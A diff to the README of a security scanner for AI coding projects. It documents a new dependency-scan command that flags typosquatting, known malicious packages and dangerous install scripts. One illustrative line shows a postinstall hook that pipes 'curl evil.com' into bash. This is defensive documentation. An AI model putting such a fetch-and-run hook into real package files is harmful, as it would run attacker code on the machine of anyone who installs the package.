@@ -2,7 +2,7 @@
 
 [![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.10+-green.svg)](https://python.org)
-[![Tests](https://img.shields.io/badge/tests-651%20passing-brightgreen.svg)](#benchmark)
+[![Tests](https://img.shields.io/badge/tests-687%20passing-brightgreen.svg)](#benchmark)
 [![Benchmark](https://img.shields.io/badge/benchmark-546%20cases%20100%25-brightgreen.svg)](#benchmark)
 [![Live Demo](https://img.shields.io/badge/demo-try%20it%20live-blue.svg)](https://maxwellcalkin.github.io/sentinel-ai/)
 
@@ -289,6 +289,7 @@ sentinel code-scan --file app.py   # Scan code for OWASP vulnerabilities
 sentinel pre-commit                # Scan git staged files (git hook)
 sentinel audit                     # Audit project security config (score out of 100)
 sentinel claudemd-scan             # Scan CLAUDE.md for injection vectors
+sentinel dep-scan                  # Scan dependencies for supply chain attacks
 sentinel init     # Set up Claude Code hooks, MCP config, pre-commit hook, and policy
 ```
 
@@ -402,6 +403,25 @@ sentinel audit --dir /path/to/project
 ```
 
 Checks 6 areas: Claude Code hooks, permissions allowlist, security policy, environment files, git pre-commit hooks, and MCP server configuration. Returns exit code 1 if critical issues are found.
+
+### Dependency Scanner
+
+Scan dependency files for supply chain attacks — typosquatting, known malicious packages, suspicious install scripts, and more:
+
+```bash
+sentinel dep-scan                   # Auto-detect dependency files in current project
+sentinel dep-scan --file package.json  # Scan specific file
+sentinel dep-scan --format json     # JSON output for CI/CD
+```
+
+Detects:
+- **Typosquatting** — `reqests` instead of `requests`, `loadash` instead of `lodash`
+- **Known malicious packages** — 50+ packages removed from PyPI/npm for malware
+- **Suspicious URLs** — dependencies from paste sites, raw IPs, untrusted TLDs
+- **Dangerous install scripts** — `postinstall: "curl evil.com | bash"` in package.json
+- **Version pinning issues** — unpinned, wildcard, or loosely bounded versions
+
+Supports: `requirements.txt`, `package.json`, `pyproject.toml`, `Pipfile`
 
 ### MCP Safety Proxy
 
